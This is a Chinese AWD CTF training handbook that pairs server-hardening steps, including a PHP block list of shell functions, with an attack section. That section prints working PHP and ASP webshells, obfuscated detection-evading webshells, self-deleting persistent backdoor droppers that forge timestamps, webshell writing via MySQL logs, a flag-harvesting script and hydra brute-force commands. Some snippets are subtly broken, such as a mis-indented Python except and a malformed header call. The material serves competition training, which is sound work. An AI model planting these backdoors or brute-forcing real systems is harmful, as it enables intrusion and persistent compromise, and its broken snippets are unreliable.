

# 奇安信攻防社区-从零学习AWD比赛指导手册

### 从零学习AWD比赛指导手册

这是一本能让你从零开始学习AWD并深入AWD的手册

### 纸上得来终觉浅,绝知此事要躬行。

![3576482431.jpg](assets/1699940304-ba0a054e28d1204521b8760a1cb67374.jpg)

**手册版本号：V1.2.2-2023/10/21**

这是一本能让你从零开始学习AWD并深入AWD的手册，如果你要参加AWD相关比赛，相信本项目能给你带来帮助~

**如果你觉得本项目不错，欢迎给我点个赞，万分感谢~~ 有什么新的攻击或者防守的姿势、手法，欢迎与我交流**

## 0# 什么是AWD

### 0.1# AWD赛制介绍

「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。

在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。

主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。

### 0.2# 比赛整体流程

-   赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 `SSH` 或者 `VNC` 的用户名和密码，还有相关IP等信息
-   安全加固环节：我们需要先自己去登录靶机服务器，进行30分钟的安全加固（源码备份/弱口令修改/代码审计和修复/漏洞修复等）
-   自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令/Web漏洞/系统漏洞等）获得Flag进行加分，对应队伍失分

## 1# 比赛环境

通常比赛环境有以下三种情况：

-   混合靶机情况：运维机器 `Windows 10` + 攻击机 `Kali Linux` + Win靶机 `Windows Server 2003/2008/2012` 或者 `Windows 7` + Linux靶机 `Centos7.x` 或者 `Ubuntu 16.04/17.01/20.04`
-   纯Linux靶机情况：运维机器 `Windows 10` + 攻击机 `Kali Linux` + Linux靶机 `Centos7.x` 或者 `Ubuntu 16.04/17.01/20.04`
-   纯Windows靶机情况：运维机器 `Windows 10` + 攻击机 `Kali Linux` + Win靶机 `Windows Server 2003/2008/2012` 或者 `Windows 7`

## 2# 安全加固环节（Defense）

### 2.0# 基本加固流程

#### 2.0.1 Windows加固流程

先备份：Web源码、数据库

1.  445加固，开启防火墙或IP高级安全策略
2.  开启系统日志审计功能
3.  禁用guest账户、关闭文件共享
4.  确保启动项内容是可控的
5.  限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置-->管理模板-->Windows组件-->远程桌面服务-->远程桌面会话主机-->连接-->限制连接的数量
6.  使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe
7.  恶意代码文件，通过PCHunter、Monitor查找
8.  Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容
9.  NTFS扫描磁盘查找隐藏的交换流数据
10.  查找系统所有账户信息，禁止非Administrator账户
11.  修改Web站点管理员访问路径、默认口令、数据库口令
12.  安装WAF脚本，防护Web站点，禁止其他漏洞

#### 2.0.2 Linux加固流程

先备份：Web源码、数据库

1.  系统口令修改，团队统一口令
2.  通过 `.bash_history` 查找历史命令操作，发现痕迹
3.  查看计划任务：`crontab -l`；编辑计划任务：`crontab -e`
4.  查看 `/etc/init.d/rc.local` 中启动服务有无异常
5.  使用脚本开启进程监控、目录监控、流量监控
6.  Web站点口令,站点管理员路径修改
7.  系统加固：iptable

### 2.1# 基本信息搜集

在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆”

#### 2.1.1 明确Linux机器信息

```c
uname -a                       //系统信息
ps -aux                        //查询进程信息
ps -ef | grep 进程名称         //筛选指定进程
id                             //用于显示用户ID，以及所属群组ID
cat /etc/passwd                //查看用户情况
ls /home/                      //查看用户情况
find / -type d -perm -002      //可写目录检查
ifconfig                       //Linux上查看网卡信息
```

#### 2.1.2 明确Windows机器信息

```c
whoami /all                    //Windows上查看用户详细信息
ipconfig  /all                 //Windows上查看网卡信息
```

#### 2.1.3 查看开放端口

```c
netstat                                                       //查看活动连接
netstat -ano/-a                                               //查看端口情况
netstat -anp                                                  //查看端口
firewall-cmd --zone= public --remove-port=80/tcp –permanent   //关闭端口
firewall-cmd –reload                                          //防火墙重启
```

#### 2.1.4 默认口令（弱口令）更改

为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456

还有其他默认密码admin，top100， top1000等

**尤其是WEB应用的后台密码修改**

```c
passwd username                                                  //ssh口令修改
set password for mycms@localhost = password('18ciweufhi28746');  //MySQL密码修改
find /var/www//html -path '*config*’                             //查找配置文件中的密码凭证
```

#### 2.1.5 找本地Flag

```c
grep -r "flag" /var/www/html/  //Linux：在Web目录下查找flag
findstr /s /i "flag" *.*       //Windows：当前目录以及所有子目录下的所有文件中查找"flag"这个字符串
```

#### 2.1.6 设置禁Ping

```c
echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all     //临时开启禁ping
echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all     //关闭禁ping
```

### 2.2# Web安全加固

#### 2.2.1 备份源码

防止在对源码进行修改时出问题，或者被攻击方删除源码而准备

压缩源码：

```C
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html
```

解压缩源码：

```C
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html
```

备份源码：

```C
mv web.tar /tmp
mv web.zip /home/xxx
```

上传和下载源码：

```c
scp username@servername:/path/filename /tmp/local_destination  //从服务器下载单个文件到本地
scp /path/local_filename username@servername:/path             //从本地上传单个文件到服务器
scp -r username@servername:remote_dir/ /tmp/local_dir          //从服务器下载整个目录到本地
scp -r /tmp/local_dir username@servername:remote_dir           //从本地上传整个目录到服务器
```

#### 2.2.2 设置只读权限

对Web文件设置只读和执行权限（PHP等动态语言需要执行权限）

```c
chmod 0555 /var/www/html/*
chmod 0555 /var/www/html/*.php
```

Web根目录设置只读和执行权限

```c
chmod 0555 /var/www/html
```

改变文件的属主和属组来设置严格的权限

```c
chown -R root:root /var/www/html/        //设置拥有人为 root:root 或 httpd:httpd (推荐)
chown -R apache:apache /var/www/html/    //确保 apache 拥有 /var/www/html/
```

#### 2.2.3 配置 `.htaccess`

利用 `.htaccess` 配置文件禁止php文件执行

```php
<Directory "/var/www/html/upload">   //指定目录后续的指令将应用于该目录
Options -ExecCGI -Indexes            //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。
AllowOverride None                   //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      
//这两个指令移除指定文件扩展名的处理器和类型。
//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。
php_flag engine off     //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
deny from all
</FilesMatch>  //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有
</Directory>
```

#### 2.2.4 PHP参数安全配置

首先找到PHP的配置文件

```c
/etc/php/{version}/php.ini
```

禁用高危函数

```php
disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link
```

配置 `open_basedir` （将用户访问文件的活动范围限制在指定的区域）

```php
open_basedir=/var/www/html
```

禁用魔术引号（自动对外部来源数据进行转义，防止SQL注入）

```php
magic_quotes_gpc = Off
```

关闭PHP伪协议

```php
allow_url_fopen = Off
allow_url_include = Off
```

重启PHP

```c
sudo service php7.0-fpm restart
sudo systemctl restart php7.0-fpm.service
```

### 2.3# 数据库安全加固

#### 2.3.1 Mysql加固

为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456

1.  不使用默认口令，修改成复杂的，并确保和web环境连接
2.  设置只允许本地127.0.0.1账户登录：修改 `bind-address=127.0.0.1` ；在配置文件中加入 `seccure_file_priv=NULL`
3.  开启日志审计功能：`general_log_file=`路径

因为最常用的是Mysql数据库，所以基本的攻防大部分都是用MySql数据库的命令

备份指定数据库：

```sql
mysqldump –u username –p password databasename > target.sql
```

备份所有数据库：

```sql
mysqldump –all -databases > all.sql
```

导入数据库：

```sql
mysql –u username –p password database < from.sql
```

对于MySQL的攻防，可以看这篇文章：[https://blog.zgsec.cn/archives/26.html](https://blog.zgsec.cn/archives/26.html)

MySQL默认配置文件路径：

```php
C:\\Program Files\MySQL\MySQLServer 5.1\my.ini   //Windows
/etc/my.cnf                                      //Linux
/etc/mysql/my.cnf                                //Linux
```

修改 `secure_file_priv` 参数（日志功能的对应目录）

```sql
secure_file_priv=""
```

重载MySQL配置

```sql
FLUSH PRIVILEGES
```

重启MySQL服务

```c
sudo service mysql restart
sudo systemctl restart mysql
```

#### 2.3.2 Mssql加固

1.  删除不必要的账号
2.  SQLServer用户口令安全
3.  根据用户分配帐号避免帐号共享
4.  分配数据库用户所需的最小权限
5.  网络访问限制
6.  SQLServer登录审计
7.  SQLServer安全事件审计
8.  配置日志功能

### 2.4# 远程控制加固

#### 2.4.1 SSH安全加固

限制IP登录方法

```c
sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件
AllowUsers username@192.168.0.100    //找到并编辑以下行，确保其取消注释并设置为所需的IP地址
```

禁用 `root` 远程登录

```c
sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件
PermitRootLogin no                   //将PermitRootLogi设置为“no”
```

按用户和组限制SSH登录

```c
sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件
AllowUsers testuser                  //设置只允许 testuser 登录SSH
AllowUsers testuser@192.168.1.100    //设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH
AllowGroups test                     //设置用户组白名单
//需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录
```

重启SSH服务

```c
sudo service sshd restart
sudo systemctl restart sshd.service
```

#### 2.4.2 RDP远程登录安全加固

删除默认帐户并手动添加新用户：

-   步骤1：按 `Win + R` 打开运行对话框，输入 `secpol.msc` 并单击 “确定”
-   步骤2：导航至此处：本地策略-->用户权限分配，再双击打开 “允许通过远程桌面服务登录”
-   步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组）
-   步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户

更改默认RDP端口号：

-   步骤1：打开运行对话框，输入 `regedit` 并单击 “确定”
-   步骤2：打开 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp` ，向下滚动并找到 `PortNumber` 然后双击它
-   步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定”

### 2.5# 应急响应

#### 2.5.1 查询进程线程

```c
netstat
ps -aux
netstat -apt
```

#### 2.5.2 杀掉进程

```c
kill -9 pid            //Linux上
taskkill /f /pid pid   //Windows上
```

#### 2.5.3 搜索WebShell文件

```c
find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件
find ./ -name '*.php' | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马
grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    //查包含关键字的php文件
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串"eval("的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看
```

#### 2.5.4 查杀不死马

也可以利用命令自动进行查找删除

```c
ps -aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9
```

然后重启服务

```c
service php-fpm restart
```

#### 2.5.5 杀弹反弹shell

老规矩查看进程

```c
ps -ef
px -aux
ps -aux | grep www-data
```

注意 `www-data` 权限的 `/bin/sh`，很有可能是nc

再就是上老一套命令

```c
kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'
```

## 3# 自由攻击环节（Attack）

### 3.0# 主要准备内容

1.  各类CMS软件包最新版准备
2.  扫描工具：Nmap、Nessus、Metasploit更新
3.  漏洞利用脚本Poc、Exp

### 3.1# 基本信息搜集

#### 3.1.1 主机信息搜集

Nmap

```c
namp -sn 192.168.0.0/24            //C段存活扫描
```

httpscan

```c
httpscan.py 192.168.0.0/24 –t 10   //C段存活扫描
```

#### 3.1.2 端口扫描

```c
nmap -sV 192.168.0.2               //扫描主机系统版本
nmap -sS 192.168.0.2               //扫描主机常用端口
nmap -sS -p 80,445 192.168.0.2     //扫描主机部分端口
nmap -sS -p- 192.168.0.2           //扫描主机全部端口
```

Python脚本

```python
import requests

for x in range(2,255): 
    url = "http://192.168.1.{}".format(x) 
    try: 
        r = requests.post(url) 
        print(url) 
        except: 
        pass
```

### 3.2# 外部打点

#### 3.2.0 常见系统漏洞

-   MS17-010（永恒之蓝，可看[https://blog.zgsec.cn/archives/172.html](https://blog.zgsec.cn/archives/172.html)）
-   MySQL进行UDF提权（SQL注入或者MySQL弱口令）
-   MsSQL进行系统命令执行（SQL注入或者MsSQL弱口令）
-   SSH弱口令或默认口令
-   PWN（这个要看具体AWD比赛提供的内容了）

#### 3.2.1 中间件漏洞

-   IIS（解析漏洞、远程代码执行）
-   Apache（解析漏洞）
-   Nginx（解析漏洞）
-   Jboss（CVE-2017-7504/CVE-2017-12149/CVE-2015-7501）
-   Mysql（弱口令）
-   Tomcat（弱口令Getshell）
-   Weblogic（CVE-2020-2551/CVE-2020-2555/CVE-2020-2883）
-   SpringBoot（未授权访问漏洞和RCE漏洞，具体可看[https://blog.zgsec.cn/archives/129.html](https://blog.zgsec.cn/archives/129.html)）

#### 3.2.2 集成服务环境漏洞

-   wampserver
-   xamppserver

#### 3.2.3 CMS漏洞利用

搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS：

-   Aspcms
-   Dedecms
-   Dicuz
-   Drupal
-   Empirecms
-   Eshop
-   Finecms
-   Joomla
-   Lamp
-   Metainfo
-   Phpcms
-   Phpwind
-   Qibocms
-   Seacms
-   Semcms
-   ThinkPHP
-   Wolfcms
-   Wordpress
-   Zabbix

备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破

#### 3.2.4 上传WebShell

常见一句话木马

```php
PHP： <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
Asp：   <%eval request ("pass")%>
Aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

Get型木马

```php
<?php eval($_GET['pass']);           //利用方式/shell.php?pass=eval($_POST[1]);
```

免杀马制作：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)

```php
<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&__=whoami 来执行whoami命令
<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell
```

隐藏的文件读取

```php
<?php
header(php'flag:'.file_get_contents('/flag'));
```

条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现

#### 3.2.5 利用WebShell

curl(跟hackbar差不多)

```c
C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
//向shell.php文件里传入参数并返回结果
```

Python多端口传参

```python
#coding=utf-8
import requests

url_head="http://192.168.182.130"   #网段
url=""
shell_addr="/upload/url/shell.php" #木马路径
passwd="pass"                   #木马密码
#port="80"
payload = {passwd: 'System(\'cat /flag\');'}
# find / -name "flag*"

#清空上次记录
flag=open("flag.txt","w")
flag.close()
flag=open("flag.txt","a")

for i in range(8000,8004):
    url=url_head+":"+str(i)+shell_addr
    try:
        res=requests.post(url,payload)#,timeout=1
        if res.status_code == requests.codes.ok:
            result = res.text
            print (result)
            flag.write(result+"\n") 
        else:
            print ("shell 404")
    except:
        print (url+" connect shell fail")

flag.close()
```

#### 3.2.6 MySQL数据库利用

具体可以看这篇文章：[https://blog.zgsec.cn/archives/26.html](https://blog.zgsec.cn/archives/26.html)

1、查看MySQL版本

```sql
show variables like '%version%';
select version();      #这个只显示MySQL版本号
```

2、查看 `load_file()` 开启状态

```sql
show variables like '%secure%';       #这条可查看详细信息
show global variables like '%secure_file_priv%';
```

3、查看日志功能是否开启和对应目录

```sql
SHOW VARIABLES LIKE 'general%';
set global general_log = "ON";
set global general_log_file='/var/www/html/test.php';   #可以写入WebShell然后直接连接蚁剑

# 往日志里面写入 WebShell
select '<?php @eval($_POST['AabyssTeam']);?>';
# 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现
```

小技巧：获取MySQL账户和对应密码Hash

```sql
# MySQL <= 5.6 版本
select host, user, password from mysql.user;

# MySQL >= 5.7 版本
select host,user,authentication_string from mysql.user;
```

#### 3.2.7 弱口令爆破

爆破SSH密码

```c
hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh
hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100
hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40      //40是⽬标服务开放的端⼝
```

爆破FTP密码

```c
hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp
hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/
```

爆破RDP远程桌面密码

```c
hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V
```

爆破Telnet

```c
hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V
```

爆破MSSQL数据库

```c
hydra -l sa -P 密码字典.txt 目标IP地址 mssql
```

爆破MySQL数据库

```c
hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql
```

### 3.3# 内网渗透

#### 3.3.1 权限维持之不死马

简单不死马：

```php
<?php
set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开，脚本将后台运行
unlink(__FILE__);     //删除自身

while(1)
{
    file_put_contents('shell.php','<?php @eval($_POST["AabyssTeam"]);?>');  //创建shell.php
    sleep(0);    //间隔时间
}
```

可以通过不断复写 `shell.php` 来达到该木马难以被使用的效果

防连接不死马：

```php
<?php
set_time_limit(0);   // 取消脚本运行时间的超时上限
ignore_user_abort(1);  // 

while(1)
{
    file_put_contents('shell.php','<?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?>');  //创建shell.php
    sleep(0);
}

//passwd=AabyssTeam
//POST传参：passwd=AabyssTeam&cmd=system('ls');
```

进阶不死马：

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '<?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?>';

while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2020-12-01 09:10:12" shell.php');  //修改时间，防止被删
    usleep(5000);
}
?>

//passwd=AabyssTeam
//POST传参：passwd=AabyssTeam&cmd=system('ls');
```

将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 `shell.php` 的WebShell文件

双重不死马：

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.login.php';
$file1 = '/admin/.register.php'; 
$code = '<?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?>';

while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2020-12-01 18:10:12" .login.php');
    file_put_contents($file1,$code);
    system('touch -m -d "2020-12-01 18:10:12" /admin/.register.php');
    usleep(5000);
}
?>

//passwd=AabyssTeam
//POST传参：passwd=AabyssTeam&cmd=system('ls');
```

浏览器访问写入的WebShell，会自动生成两个不死马： `.login.php` 和 `/admin/.register.php`

#### 3.3.2 关键文件检索

组件检索

```c
find / -name "apaech2.conf"                 //检索Apache主配置文件
find / -name "nginx.conf"                   //检索Nginx目录
find / -path "*nginx*" -name nginx*conf     //检索Nginx配置目录
find / -name "httpd.conf"                   //检索Apache目录
find / -path "*apache*" -name apache*conf   //检索Apache配置目录
```

网站首页

```c
find / -name "index.php"                    //定位网站目录
find / -name "index.html"                   //定位网站目录
```

日志文件检索

```c
/var/log/nginx/                           //默认Nginx日志目录
/var/log/apache/                          //默认Apache日志目录
/var/log/apache2/                         //默认Apache日志目录
/usr/local/tomcat/logs                    //Tomcat日志目录
tail -f xxx.log                           //实时刷新滚动日志文件
```

#### 3.3.3 Linux提权

查询系统版本信息命令：

```c
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

查询内核版本信息命令：

```c
uname -a
uname -mrs
cat /proc/version
cat /etc/issue
lsb_release -a
hostnamectl  
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```

查看系统环境变量命令：

```c
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

查看语言环境信息命令：

```c
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
set
```

查看文件上传环境信息命令：

```c
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

这里列举一些可用利用的提权漏洞：

-   CVE-2023-0386（Linux OverlayFS权限提升漏洞）
-   CVE-2021-4034（Linux Polkit本地权限提升漏洞）
-   CVE-2017-6074 （DCCP双重释放漏洞 > 2.6.18 ）
-   CVE-2016-5195（脏牛，kernel 2.6.22 < 3.9 (x86/x64)）
-   CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）
-   CVE-2017-1000367（sudo本地提权漏洞 ）
-   CVE-2016-1247（Nginx权限提升漏洞）
-   CVE-2017-16995（Ubuntu16.04 kernel:4.14-4.4）

Kali命令查询：

```php
searchsploit CentOS 7
searchsploit Ubuntu 16.04
```

提权Exploit寻找：

-   [http://www.exploit-db.com](http://www.exploit-db.com/)
-   [http://metasploit.com/modules/](http://metasploit.com/modules/)
-   [http://securityreason.com](http://securityreason.com/)
-   [http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)
-   [https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main)

编译提权Exp

```php
gcc -o /usr/share/nginx/html/***** /usr/share/nginx/html/*****.c -Wall
```

直接提权，确认权限：

```php
cat /etc/shadow
```

其他提权姿势：[https://www.freebuf.com/articles/system/244627.html](https://www.freebuf.com/articles/system/244627.html)

#### 3.3.4 Windows提权

这里列举一些Windows的漏洞：

-   各种Potato（Github上面基本都有）
-   CVE-2023-35359（Windows内核权限提升漏洞，开源了）
-   CVE-2022-24521（没有Exp的可以找我要）
-   CVE-2019-1405
-   CVE-2019-1322
-   MS17-017（整型溢出漏洞）

## 4# 参考链接

-   [http://freebuf.com/](http://freebuf.com/)
-   [https://blog.zgsec.cn/](https://blog.zgsec.cn/)
-   [https://paper.seebug.org/3044/](https://paper.seebug.org/3044/)
-   [https://www.anquanke.com/](https://www.anquanke.com/)
-   [https://www.exploit-db.com/](https://www.exploit-db.com/)
-   [http://www.bugscan.net/source/template/vulns/](http://www.bugscan.net/source/template/vulns/)
-   [https://xz.aliyun.com/t/12687](https://xz.aliyun.com/t/12687)
